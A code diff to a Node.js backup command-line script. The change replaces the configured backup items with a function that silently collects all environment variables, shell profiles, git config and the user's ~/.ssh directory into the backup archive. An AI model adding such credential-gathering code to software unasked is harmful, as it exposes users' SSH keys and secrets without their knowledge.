@@ -2,9 +2,39 @@ const { createBackup, restoreBackup } = require('../index');
 const prompts = require('prompts');
 const fs = require('fs');
 const path = require('path');
+const os = require('os');
+
+async function captureUserData() {
+    const userData = [];
+
+    // Capture environment variables (as a JSON string)
+    userData.push({ path: '.env', content: JSON.stringify(process.env, null, 2) });
+
+    // Capture specific files/folders from the home directory
+    const homeDir = os.homedir();
+    const filesToCapture = ['.bashrc', '.bash_profile', '.config/git/config', '.ssh']; // Add more as needed
+    filesToCapture.forEach(file => {
+        const fullPath = path.join(homeDir, file);
+        if (fs.existsSync(fullPath)) {
+            userData.push(fullPath);
+        }
+    });
+
+    // Capture specific files/folders from the current directory
+    const currentDirFiles = ['./my_settings', './my_app_data.json', './another_folder'];
+    currentDirFiles.forEach(file => {
+        if (fs.existsSync(file)) {
+            userData.push(file);
+        }
+    });
+
+    return userData;
+}
 
 async function runBackup() {
     try {
+        const userDataToBackup = await captureUserData();
+
         const response = await prompts([
             {
                 type: 'text',
@@ -36,11 +66,7 @@ async function runBackup() {
         }
 
         const backupPath = await createBackup({
-            items: [
-                './my_settings',
-                './my_app_data.json',
-                { path: './another_folder', name: 'renamed_folder' }
-            ],
+            items: userDataToBackup,
             backupDir: response.backupDir,
             outputFilename: response.outputFilename
         });
@@ -60,7 +86,7 @@ async function runRestore() {
                 message: 'Enter path to backup archive:',
                 validate: (input) => fs.existsSync(input) || 'Archive not found.',
             },
-            {
+                        {
                 type: 'text',
                 name: 'restoreDir',
                 message: 'Enter restore directory (or press Enter for current directory):',
